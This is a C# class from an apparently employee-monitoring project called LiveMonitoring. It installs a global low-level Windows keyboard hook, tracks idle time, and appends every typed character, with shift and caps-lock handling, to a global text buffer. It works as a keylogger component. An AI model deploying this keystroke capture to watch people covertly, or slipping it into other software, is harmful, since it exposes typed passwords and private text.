using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace LiveMonitoring
{
    internal class keyboardHook
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;


        public static void KeyBordStart()
        {
            try
            {
                if (!GlobalClass.Iskeyhook)
                {

                    _hookID = SetHook(_proc);
                    System.Threading.Thread.Sleep(1000);
                    GlobalClass.Iskeyhook = true;
                    GlobalClass.WriteTolog("KeyBoard Hook Start");
                }
            }
            catch (Exception)
            {
                GlobalClass.Iskeyhook = false;
            }
        }

        public static void KeyBordStop()
        {
            try
            {
                UnhookWindowsHookEx(_hookID);
                GlobalClass.Iskeyhook = false;
            }
            catch (Exception)
            {
                GlobalClass.Iskeyhook = true;
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }


        private delegate IntPtr LowLevelKeyboardProc(
         int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(
       int nCode, IntPtr wParam, IntPtr lParam)
        {
            try
            {
                if (GlobalClass.ApplicationNowTime >= GlobalClass.LastIdletime.AddSeconds(Program.Idle_MinTime) && wParam == (IntPtr)WM_KEYDOWN)
                {
                    GlobalClass.lastIdleMinute = GlobalClass.ApplicationNowTime.Subtract(GlobalClass.LastIdletime).Minutes;
                    Console.WriteLine("Keybord hook Idletime update is :- " + GlobalClass.lastIdleMinute);
                    //send your idle time
                }
                GlobalClass.LastIdletime = GlobalClass.ApplicationNowTime;
              
                if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    if (Control.ModifierKeys != Keys.Shift && Control.ModifierKeys != Keys.Control)
                    {
                        if (vkCode != 13)//caplock on but not enter key
                        {
                            GlobalClass.KeyBordText += GetKeyValue.GetPressValue(Convert.ToString((Keys)vkCode), Control.IsKeyLocked(Keys.CapsLock));
                        }

                        Console.Write(GetKeyValue.GetPressValue(Convert.ToString((Keys)vkCode), Control.IsKeyLocked(Keys.CapsLock)));
                    }
                    else if (Control.ModifierKeys == Keys.Shift)
                    {
                        if (vkCode != 13)
                        {
                            GlobalClass.KeyBordText += GetKeyValue.GetShiftValue(Convert.ToString((Keys)vkCode), Control.IsKeyLocked(Keys.CapsLock));
                        }
                        Console.Write(GetKeyValue.GetShiftValue(Convert.ToString((Keys)vkCode), Control.IsKeyLocked(Keys.CapsLock)));
                    }

                }
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
            catch (Exception)
            {
                GlobalClass.Iskeyhook = false;
                return CallNextHookEx(_hookID, nCode, wParam, lParam);
            }
        }
    }
}
